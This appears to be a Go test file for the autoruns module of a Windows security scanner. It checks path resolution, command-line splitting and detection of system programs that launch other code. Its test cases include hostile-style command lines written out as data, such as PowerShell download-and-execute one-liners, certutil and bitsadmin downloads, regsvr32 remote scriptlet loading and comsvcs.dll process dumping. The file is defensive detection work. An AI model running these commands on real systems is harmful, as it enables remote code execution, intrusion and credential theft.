package autoruns

import (
	"reflect"
	"strings"
	"testing"

	"lanterna/internal/scan"
)

// fakeEnv è un ambiente di Windows finto: variabili (senza maiuscole) e file
// esistenti.
type fakeEnv struct {
	vars  map[string]string
	files map[string]bool
}

func newFakeEnv(files ...string) *fakeEnv {
	f := &fakeEnv{vars: map[string]string{
		"systemroot":              `C:\Windows`,
		"systemdrive":             `C:`,
		"programfiles":            `C:\Program Files`,
		"programfiles(x86)":       `C:\Program Files (x86)`,
		"programw6432":            `C:\Program Files`,
		"commonprogramfiles":      `C:\Program Files\Common Files`,
		"commonprogramfiles(x86)": `C:\Program Files (x86)\Common Files`,
		"programdata":             `C:\ProgramData`,
		"userprofile":             `C:\Users\anna`,
		"appdata":                 `C:\Users\anna\AppData\Roaming`,
		"localappdata":            `C:\Users\anna\AppData\Local`,
		"path":                    `C:\Windows\system32;C:\Windows;C:\Tools\bin;relativo`,
	}, files: map[string]bool{}}
	for _, p := range files {
		f.files[strings.ToLower(p)] = true
	}
	return f
}

func (f *fakeEnv) resolver() Resolver {
	return Resolver{
		Getenv: func(k string) string { return f.vars[strings.ToLower(k)] },
		Exists: func(p string) bool { return f.files[strings.ToLower(p)] },
	}
}

func TestExpand(t *testing.T) {
	r := newFakeEnv().resolver()
	for _, c := range []struct {
		in    string
		wow32 bool
		want  string
	}{
		{`%ProgramFiles%\App\a.exe`, false, `C:\Program Files\App\a.exe`},
		{`%ProgramFiles%\App\a.exe`, true, `C:\Program Files (x86)\App\a.exe`},
		{`%CommonProgramFiles%\x.dll`, true, `C:\Program Files (x86)\Common Files\x.dll`},
		{`%SystemRoot%\system32\svchost.exe -k netsvcs`, false, `C:\Windows\system32\svchost.exe -k netsvcs`},
		{`%NONESISTE%\x.exe %USERPROFILE%`, false, `%NONESISTE%\x.exe C:\Users\anna`},
		{`100% sicuro`, false, `100% sicuro`},
		{`%a b%c%LOCALAPPDATA%`, false, `%a b%cC:\Users\anna\AppData\Local`},
	} {
		if got := r.Expand(c.in, c.wow32); got != c.want {
			t.Errorf("Expand(%q, %v) = %q, atteso %q", c.in, c.wow32, got, c.want)
		}
	}
}

func TestCandidatesAndLocate(t *testing.T) {
	env := newFakeEnv(`C:\Program Files (x86)\Vendor\up.exe`, `C:\Windows\SysWOW64\legacy.dll`, `C:\Tools\bin\tool.exe`, `C:\Program Files\Solo64\a.exe`)
	r := env.resolver()
	for _, c := range []struct {
		in    string
		wow32 bool
		want  string
	}{
		{`\SystemRoot\System32\drivers\x.sys`, false, `C:\Windows\System32\drivers\x.sys`},
		{`System32\drivers\y.sys`, false, `C:\Windows\System32\drivers\y.sys`},
		{`system32\DRIVERS\z.sys`, false, `C:\Windows\system32\DRIVERS\z.sys`},
		{`\??\C:\Vendor\drv.sys`, false, `C:\Vendor\drv.sys`},
		{`"C:\Program Files\App\a.exe"`, false, `C:\Program Files\App\a.exe`},
		// Voce a 32 bit: %ProgramFiles% punta alla cartella (x86).
		{`%ProgramFiles%\Vendor\up.exe`, true, `C:\Program Files (x86)\Vendor\up.exe`},
		// ...ma se il file sta nella cartella nativa si trova lo stesso.
		{`%ProgramFiles%\Solo64\a.exe`, true, `C:\Program Files\Solo64\a.exe`},
		// Un programma a 32 bit che chiede System32 legge SysWOW64.
		{`C:\Windows\System32\legacy.dll`, true, `C:\Windows\SysWOW64\legacy.dll`},
		// Solo il nome: cartelle di sistema, poi il PATH; .exe aggiunto.
		{`tool`, false, `C:\Tools\bin\tool.exe`},
		{`notepad.exe`, false, `C:\Windows\System32\notepad.exe`},
		{`\Vendor\x.exe`, false, `C:\Vendor\x.exe`},
		{``, false, ``},
		// Condivisione di rete nella forma lunga: resta una condivisione.
		{`\\?\UNC\srv\share\x.exe`, false, `\\srv\share\x.exe`},
		{`\??\UNC\srv\share\x.sys`, false, `\\srv\share\x.sys`},
	} {
		if got := r.Locate(c.in, c.wow32); got != c.want {
			t.Errorf("Locate(%q, %v) = %q, atteso %q", c.in, c.wow32, got, c.want)
		}
	}
	// Il PATH non porta cartelle relative.
	for _, c := range r.Candidates("x", false) {
		if strings.HasPrefix(strings.ToLower(c), "relativo") {
			t.Errorf("cartella relativa del PATH usata: %s", c)
		}
	}
	// Prefissi con lettere che cambiano lunghezza in minuscolo: nessun taglio sbagliato.
	if got := r.Locate("\u0130\\SystemRoot\\x.exe", false); !strings.HasPrefix(got, `C:\Windows\`) {
		t.Errorf("percorso relativo con İ: %q", got)
	}
}

func TestSplit(t *testing.T) {
	r := newFakeEnv(`C:\Program Files\Senza Est\prog`, `C:\Program Files\Vendor App\svc.exe`).resolver()
	for _, c := range []struct {
		in, file, args string
		quoted         bool
	}{
		{`"C:\Program Files\App\a.exe" --min`, `C:\Program Files\App\a.exe`, `--min`, true},
		{`"C:\Program Files\App\a.exe`, `C:\Program Files\App\a.exe`, ``, true},
		{`C:\Program Files\Vendor App\svc.exe -k x`, `C:\Program Files\Vendor App\svc.exe`, `-k x`, false},
		{`C:\Users\anna\AppData\Local\Discord\Update.exe --processStart Discord.exe`, `C:\Users\anna\AppData\Local\Discord\Update.exe`, `--processStart Discord.exe`, false},
		{`rundll32.exe shell32.dll,Control_RunDLL x`, `rundll32.exe`, `shell32.dll,Control_RunDLL x`, false},
		{`C:\My App.v2\x.exe /s`, `C:\My App.v2\x.exe`, `/s`, false},
		// Senza estensione: il primo prefisso che esiste, come CreateProcess.
		{`C:\Program Files\Senza Est\prog --x`, `C:\Program Files\Senza Est\prog`, `--x`, false},
		// Nulla esiste: il primo pezzo.
		{`ignoto argomento`, `ignoto`, `argomento`, false},
		{`  `, ``, ``, false},
		// Programma senza estensione e argomento con un'estensione eseguibile
		// (B-M1): il file non va oltre un'opzione o un percorso con l'unità.
		{`powershell -ExecutionPolicy Bypass -File C:/Scripts/backup.ps1`, `powershell`, `-ExecutionPolicy Bypass -File C:/Scripts/backup.ps1`, false},
		{`cmd /c C:\Tools\avvio.bat`, `cmd`, `/c C:\Tools\avvio.bat`, false},
		{`wscript C:/Tools/x.vbs`, `wscript`, `C:/Tools/x.vbs`, false},
		{`msiexec /i "C:\x y\a.msi"`, `msiexec`, `/i "C:\x y\a.msi"`, false},
		// Un trattino da solo o una cartella che comincia con «-» non sono opzioni.
		{`C:\Program Files\Foo - Bar\a.exe -x`, `C:\Program Files\Foo - Bar\a.exe`, `-x`, false},
		{`C:\Dati -Backup\b.exe /s`, `C:\Dati -Backup\b.exe`, `/s`, false},
	} {
		f, a, q := r.Split(c.in, false)
		if f != c.file || a != c.args || q != c.quoted {
			t.Errorf("Split(%q) = %q, %q, %v; atteso %q, %q, %v", c.in, f, a, q, c.file, c.args, c.quoted)
		}
	}
	// Il prefisso più corto che esiste vince, come in CreateProcess.
	r = newFakeEnv(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `C:\Tools\run.exe`).resolver()
	for in, want := range map[string]string{
		`powershell -nop C:\x\a.ps1`:           `powershell`,
		`powershell x.ps1`:                     `powershell`,
		`C:\Tools\run.exe C:\Tools\other.exe`:  `C:\Tools\run.exe`,
		`C:\Tools\run.exe argomento con.exe x`: `C:\Tools\run.exe`,
	} {
		if f, _, _ := r.Split(in, false); f != want {
			t.Errorf("Split(%q) = %q, atteso %q", in, f, want)
		}
	}
	// Un file che esiste vale anche oltre un pezzo che sembra un'opzione,
	// come per CreateProcess; se manca, il file si ferma prima.
	r = newFakeEnv(`C:\Program Files\Foo -Bar Baz\a.exe`).resolver()
	for in, want := range map[string]string{
		`C:\Program Files\Foo -Bar Baz\a.exe /x`:      `C:\Program Files\Foo -Bar Baz\a.exe`,
		`C:\Program Files\Manca -Beta 2\a.exe /x`:     `C:\Program`,
		`C:\Program Files\Manca\a.exe -File C:\x.ps1`: `C:\Program Files\Manca\a.exe`,
	} {
		if f, _, _ := r.Split(in, false); f != want {
			t.Errorf("Split(%q) = %q, atteso %q", in, f, want)
		}
	}
}

// Le voci delle attività e delle chiavi Run scritte senza estensione non
// diventano «file mancante» (B-M1).
func TestSplitProxyEntries(t *testing.T) {
	rd := testReader(newFakeEnv(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `C:\Windows\System32\cmd.exe`, `C:\Windows\System32\wscript.exe`))
	e := scan.AutorunEntry{Category: "logon", Kind: "run", Name: "x", Enabled: true}
	for cmd, want := range map[string][2]string{
		`powershell -ExecutionPolicy Bypass -File C:/Scripts/backup.ps1`: {`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `C:\Scripts\backup.ps1`},
		`cmd /c C:\Tools\avvio.bat`:                                      {`C:\Windows\System32\cmd.exe`, `C:\Tools\avvio.bat`},
		`wscript C:/Tools/x.vbs`:                                         {`C:\Windows\System32\wscript.exe`, `C:\Tools\x.vbs`},
	} {
		it := rd.commandItem(e, cmd, false)
		if it.file != want[0] || it.target != want[1] {
			t.Errorf("%q: file %q, target %q; attesi %q", cmd, it.file, it.target, want)
		}
	}
}

func TestInterceptorCandidates(t *testing.T) {
	got := InterceptorCandidates(`C:\Program Files\Vendor App\Sub Dir\svc.exe`)
	want := []string{`C:\Program.exe`, `C:\Program Files\Vendor.exe`, `C:\Program Files\Vendor App\Sub.exe`}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("candidati: %q", got)
	}
	// Un componente con estensione si prova com'è; doppi spazi una volta sola.
	got = InterceptorCandidates(`C:\My.App  x\a.exe`)
	if !reflect.DeepEqual(got, []string{`C:\My.App`}) {
		t.Errorf("con estensione: %q", got)
	}
	if InterceptorCandidates(`C:\Windows\system32\svchost.exe`) != nil {
		t.Error("percorso senza spazi")
	}
}

func TestProxyTarget(t *testing.T) {
	for _, c := range []struct {
		file, args, target string
		proxy              bool
	}{
		{`C:\Windows\System32\rundll32.exe`, `shell32.dll,Control_RunDLL desk.cpl`, `desk.cpl`, true},
		{`rundll32`, `"C:\Users\anna\AppData\Roaming\x y\evil.dll",Start`, `C:\Users\anna\AppData\Roaming\x y\evil.dll`, true},
		{`rundll32.exe`, `C:\ProgramData\a.dll Entry`, `C:\ProgramData\a.dll`, true},
		{`rundll32.exe`, `javascript:"\..\mshtml,RunHTMLApplication ";alert(1)`, ``, true},
		{`regsvr32.exe`, `/s /n /u /i:http://x/y.sct scrobj.dll`, ``, true},
		{`mshta.exe`, `C:\ProgramData\run.hta`, `C:\ProgramData\run.hta`, true},
		{`mshta.exe`, `vbscript:Execute("x")`, ``, true},
		{`wscript.exe`, `//B //Nologo "C:\Users\anna\a b.vbs" /arg`, `C:\Users\anna\a b.vbs`, true},
		{`cscript`, `/nologo C:\x\y.js`, `C:\x\y.js`, true},
		{`powershell.exe`, `-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\anna\s.ps1" -x 1`, `C:\Users\anna\s.ps1`, true},
		{`powershell.exe`, `-nop -w hidden -f C:\a.ps1`, `C:\a.ps1`, true},
		{`powershell.exe`, `-ep bypass C:\b.ps1`, `C:\b.ps1`, true},
		{`powershell.exe`, `-NoProfile -Command "Get-Process"`, ``, true},
		{`powershell.exe`, `-enc ZQBjAGgAbwA=`, ``, true},
		{`pwsh.exe`, `Write-Host ciao`, ``, true},
		{`C:\Windows\System32\cmd.exe`, `/c "C:\Program Files\App\run.bat" x`, `C:\Program Files\App\run.bat`, true},
		{`cmd.exe`, `/q /c start "" /min "C:\Users\anna\x.exe"`, `C:\Users\anna\x.exe`, true},
		{`cmd`, `/c call C:\x\y.cmd`, `C:\x\y.cmd`, true},
		{`cmd.exe`, `/c echo ciao > nul`, ``, true},
		{`cmd.exe`, `/c start https://example.com`, ``, true},
		{`C:\Program Files\App\app.exe`, `/background`, ``, false},
		{`powershell.exe`, ``, ``, true},
		// rundll32 con un'opzione prima della DLL: attività di Windows
		// SystemRestore\SR e Autochk\Proxy (B1).
		{`%windir%\system32\rundll32.exe`, `/d srrstr.dll,ExecuteScheduledSPPCreation`, `srrstr.dll`, true},
		{`%windir%\system32\rundll32.exe`, `/d acproxy.dll,PerformAutochkOperations`, `acproxy.dll`, true},
		{`rundll32.exe`, `-sta {AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}`, ``, true},
		{`rundll32.exe`, `-localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617`, ``, true},
		{`rundll32.exe`, `/d`, ``, true},
		// DLL di Windows che lanciano l'argomento (B2, LOLBAS).
		{`rundll32.exe`, `shell32.dll,ShellExec_RunDLL C:\Users\anna\AppData\Roaming\x.exe`, `C:\Users\anna\AppData\Roaming\x.exe`, true},
		{`rundll32.exe`, `C:\Windows\System32\shell32.dll,ShellExec_RunDLLW "C:\Users\anna\a b\x.exe" /s`, `C:\Users\anna\a b\x.exe`, true},
		{`rundll32.exe`, `url.dll,FileProtocolHandler http://example.invalid/x`, ``, true},
		{`rundll32.exe`, `url.dll,OpenURL C:\Users\anna\x.hta`, `C:\Users\anna\x.hta`, true},
		{`rundll32.exe`, `zipfldr.dll,RouteTheCall C:\Users\Public\x.exe`, `C:\Users\Public\x.exe`, true},
		{`rundll32.exe`, `advpack.dll,LaunchINFSection C:\x\a.inf,DefaultInstall_SingleUser,1,`, ``, true},
		{`rundll32.exe`, `ieadvpack.dll,RegisterOCX C:\x\a.exe`, `C:\x\a.exe`, true},
		{`rundll32.exe`, `pcwutl.dll,LaunchApplication C:\x\a.exe`, `C:\x\a.exe`, true},
		{`rundll32.exe`, `setupapi.dll,InstallHinfSection DefaultInstall 128 C:\x\a.inf`, ``, true},
		{`rundll32.exe`, `shell32.dll,Control_RunDLL C:\Users\anna\x.cpl`, `C:\Users\anna\x.cpl`, true},
		{`rundll32.exe`, `shell32.dll,Control_RunDLL`, `shell32.dll`, true},
		{`rundll32.exe`, `comsvcs.dll,MiniDump 624 C:\x\l.dmp full`, ``, true},
		// La DLL di un fornitore con altri argomenti resta la DLL; una copia di
		// shell32 fuori da Windows è il file eseguito.
		{`rundll32.exe`, `C:\Vendor\x.dll,Start /bg`, `C:\Vendor\x.dll`, true},
		{`rundll32.exe`, `C:\Users\anna\AppData\shell32.dll,ShellExec_RunDLL C:\Windows\notepad.exe`, `C:\Users\anna\AppData\shell32.dll`, true},
		// regsvr32 /i: (E3, T1218.010).
		{`regsvr32.exe`, `/s /i:C:\Users\anna\x.sct scrobj.dll`, ``, true},
		{`regsvr32.exe`, `/s /n /i:"https://x/y.sct" C:\Vendor\v.dll`, ``, true},
		{`regsvr32.exe`, `/s /n /i:U shell32.dll`, `shell32.dll`, true},
		{`regsvr32.exe`, `/s C:\Vendor\v.dll`, `C:\Vendor\v.dll`, true},
		{`regsvr32.exe`, `scrobj.dll`, `scrobj.dll`, true},
		{`regsvr32.exe`, `/s /i:x C:\Users\anna\scrobj.dll`, `C:\Users\anna\scrobj.dll`, true},
		// cmd che avvia un altro programma che esegue altro (B-M2).
		{`cmd.exe`, `/c start /min powershell.exe -nop -w hidden -c "iex (iwr http://x)"`, ``, true},
		{`cmd.exe`, `/c powershell.exe -w hidden -enc ZQB4AA==`, ``, true},
		{`cmd.exe`, `/c wscript.exe C:\Users\anna\AppData\Roaming\x.vbs`, `C:\Users\anna\AppData\Roaming\x.vbs`, true},
		{`cmd.exe`, `/c rundll32 C:\Users\anna\evil.dll,Run`, `C:\Users\anna\evil.dll`, true},
		{`cmd.exe`, `/c start "" C:\Windows\System32\cmd.exe /c C:\x\y.bat`, `C:\x\y.bat`, true},
		{`cmd.exe`, `/c C:\Users\anna\AppData\powershell.exe -c x`, `C:\Users\anna\AppData\powershell.exe`, true},
		{`cmd.exe`, `/c C:\Windows\System32\msiexec.exe /x {11111111-2222-3333-4444-555555555555}`, `C:\Windows\System32\msiexec.exe`, true},
		{`cmd.exe`, `/c cmd /c cmd /c cmd /c cmd /c cmd /c C:\x\fondo.bat`, ``, true},
		// Altri programmi di Windows che eseguono ciò che ricevono (B-M3, E-M1).
		{`C:\Windows\System32\msiexec.exe`, `/q /i http://example.invalid/x.msi`, ``, true},
		{`msiexec.exe`, `/i C:\Users\anna\x.msi /qn`, `C:\Users\anna\x.msi`, true},
		{`msiexec`, `/y C:\x\a.dll`, `C:\x\a.dll`, true},
		{`C:\Windows\system32\msiexec.exe`, `/V`, ``, false},
		{`msiexec.exe`, `/x {11111111-2222-3333-4444-555555555555} /qn`, ``, false},
		{`control.exe`, `C:\Users\anna\x.cpl`, `C:\Users\anna\x.cpl`, true},
		{`control.exe`, `/name Microsoft.WindowsUpdate`, ``, true},
		{`explorer.exe`, `C:\Users\Public\x.exe`, `C:\Users\Public\x.exe`, true},
		{`explorer.exe`, ``, ``, true},
		{`explorer.exe`, `/factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding`, ``, true},
		{`conhost.exe`, `--headless powershell.exe -w hidden -enc AAAA`, ``, true},
		{`conhost.exe`, `--headless C:\Users\anna\x.exe`, `C:\Users\anna\x.exe`, true},
		{`conhost.exe`, `0xffffffff -ForceV1 --width 80 --height 25 cmd /c C:\x\y.bat`, `C:\x\y.bat`, true},
		{`certutil.exe`, `-urlcache -f http://example.invalid/x C:\Users\Public\x.exe`, ``, true},
		{`bitsadmin.exe`, `/transfer j http://example.invalid/x C:\x.exe`, ``, true},
		{`pcalua.exe`, `-a C:\x\y.exe`, `C:\x\y.exe`, true},
		{`forfiles.exe`, `/p C:\Windows /m notepad.exe /c calc.exe`, ``, true},
		{`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`, `/logfile= /LogToConsole=false /U C:\x\a.dll`, `C:\x\a.dll`, true},
		{`regasm.exe`, `/U C:\x\a.dll`, `C:\x\a.dll`, true},
		{`odbcconf.exe`, `/a {REGSVR C:\x\a.dll}`, `C:\x\a.dll`, true},
		{`cmstp.exe`, `/s /ns C:\x\a.inf`, ``, true},
		{`mmc.exe`, `C:\Users\anna\x.msc`, `C:\Users\anna\x.msc`, true},
		{`mmc.exe`, `-a`, ``, true},
		{`hh.exe`, `http://example.invalid/x.chm`, ``, true},
		{`wmic.exe`, `process call create calc.exe`, ``, true},
		{`schtasks.exe`, `/run /tn Aggiorna`, ``, true},
		{`mavinject.exe`, `1234 /INJECTRUNNING C:\x\a.dll`, `C:\x\a.dll`, true},
		{`register-cimprovider.exe`, `-path C:\x\a.dll`, `C:\x\a.dll`, true},
		{`wuauclt.exe`, `/UpdateDeploymentProvider C:\x\a.dll /RunHandlerComServer`, `C:\x\a.dll`, true},
		{`wuauclt.exe`, `/detectnow`, ``, false},
		// Script di sistema che eseguono ciò che ricevono (T1216).
		{`cscript.exe`, `/b C:\Windows\System32\Printing_Admin_Scripts\it-IT\pubprn.vbs 127.0.0.1 script:https://x/y.sct`, ``, true},
		{`cscript.exe`, `/b C:\Users\anna\pubprn.vbs 127.0.0.1`, `C:\Users\anna\pubprn.vbs`, true},
		// Una copia di un programma o di una DLL di Windows in una sua
		// sottocartella scrivibile dagli utenti (Temp, Tasks) è il file
		// eseguito, non quello di Windows.
		{`rundll32.exe`, `C:\Windows\Temp\shell32.dll,ShellExec_RunDLL C:\Windows\System32\notepad.exe`, `C:\Windows\Temp\shell32.dll`, true},
		{`rundll32.exe`, `%windir%\Tasks\url.dll,FileProtocolHandler C:\Windows\notepad.exe`, `%windir%\Tasks\url.dll`, true},
		{`cmd.exe`, `/c C:\Windows\Tasks\cmd.exe /c C:\Windows\System32\notepad.exe`, `C:\Windows\Tasks\cmd.exe`, true},
		{`cmd.exe`, `/c C:\Windows\System32\..\Tasks\cmd.exe /c x`, `C:\Windows\System32\..\Tasks\cmd.exe`, true},
		{`cmd.exe`, `/c C:\Windows\..\Tools\cmd.exe /c x`, `C:\Windows\..\Tools\cmd.exe`, true},
		{`cmd.exe`, `/c C:\Windows\Temp\..\System32\cmd.exe /c C:\Users\anna\x.bat`, `C:\Users\anna\x.bat`, true},
		{`cmd.exe`, `/c C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe C:\x\a.dll`, `C:\x\a.dll`, true},
		{`cmd.exe`, `/c %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -enc AAAA`, ``, true},
		// Una DLL lanciatrice che apre un altro programma di Windows che
		// esegue un comando (LOLBAS: ShellExec_RunDLL "cmd.exe" "/c ...").
		{`rundll32.exe`, `shell32.dll,ShellExec_RunDLL cmd.exe /c C:\Windows\System32\notepad.exe`, `C:\Windows\System32\notepad.exe`, true},
		{`rundll32.exe`, `SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"`, ``, true},
		{`rundll32.exe`, `url.dll,FileProtocolHandler powershell.exe -w hidden -enc AAAA`, ``, true},
		{`pcalua.exe`, `-a C:\Windows\System32\cmd.exe -c "/c calc"`, ``, true},
		{`explorer.exe`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, ``, true},
		{`pcalua.exe`, `-a C:\Users\anna\x.exe`, `C:\Users\anna\x.exe`, true},
		// PowerShell 7 nella sua cartella è l'interprete; una copia altrove no.
		{`cmd.exe`, `/c "C:\Program Files\PowerShell\7\pwsh.exe" -w hidden -enc AAAA`, ``, true},
		{`cmd.exe`, `/c %ProgramFiles%\PowerShell\7-preview\pwsh.exe -c x`, ``, true},
		{`cmd.exe`, `/c "C:\Program Files\PowerShell\Tools\x\pwsh.exe" -c x`, `C:\Program Files\PowerShell\Tools\x\pwsh.exe`, true},
		{`cmd.exe`, `/c C:\Users\anna\pwsh.exe -c x`, `C:\Users\anna\pwsh.exe`, true},
	} {
		got, proxy := ProxyTarget(c.file, c.args)
		if got != c.target || proxy != c.proxy {
			t.Errorf("ProxyTarget(%q, %q) = %q, %v; atteso %q, %v", c.file, c.args, got, proxy, c.target, c.proxy)
		}
	}
}

// Un programma di Windows che esegue ciò che riceve non rende «di Windows»
// la voce quando non si sa quale file esegua: si elenca (comando
// interpretato); quando lo si sa, conta quel file.
func TestProxyEntriesListed(t *testing.T) {
	rd := testReader(newFakeEnv(`C:\Windows\System32\msiexec.exe`, `C:\Windows\System32\certutil.exe`, `C:\Windows\System32\conhost.exe`, `C:\Windows\explorer.exe`))
	e := scan.AutorunEntry{Category: "logon", Kind: "run", Name: "x", Enabled: true}
	for _, c := range []struct {
		cmd    string
		target string
		listed bool
	}{
		{`C:\Windows\System32\msiexec.exe /q /i http://example.invalid/x.msi`, ``, true},
		{`C:\Windows\System32\certutil.exe -urlcache -f http://example.invalid/x C:\Users\Public\x.exe`, ``, true},
		{`C:\Windows\System32\conhost.exe --headless powershell.exe -w hidden -enc AAAA`, ``, true},
		{`C:\Windows\explorer.exe C:\Users\Public\x.exe`, `C:\Users\Public\x.exe`, true},
		{`C:\Windows\system32\rundll32.exe shell32.dll,ShellExec_RunDLL C:\Users\anna\AppData\Roaming\x.exe`, `C:\Users\anna\AppData\Roaming\x.exe`, true},
		{`regsvr32.exe /s /n /u /i:http://example.invalid/x.sct scrobj.dll`, ``, true},
		{`cmd.exe /c start /min powershell.exe -nop -w hidden -c "iex (iwr http://x)"`, ``, true},
		// Il servizio di Windows Installer resta di Windows.
		{`C:\Windows\System32\msiexec.exe /V`, ``, false},
	} {
		it := rd.commandItem(e, c.cmd, false)
		// I file come li verificherebbe Windows: tutti di Microsoft.
		it.entry.File = msFile("windows")
		if it.target != "" {
			it.entry.Target = &scan.FileFacts{Path: it.target, Folder: "appData", Signature: &scan.FileSignature{Status: "unsigned"}}
		}
		if it.target != c.target || windowsEntry(it) == c.listed {
			t.Errorf("%q: target %q, interpretato %v, nascosta %v", c.cmd, it.target, it.interpreted, windowsEntry(it))
		}
	}
}
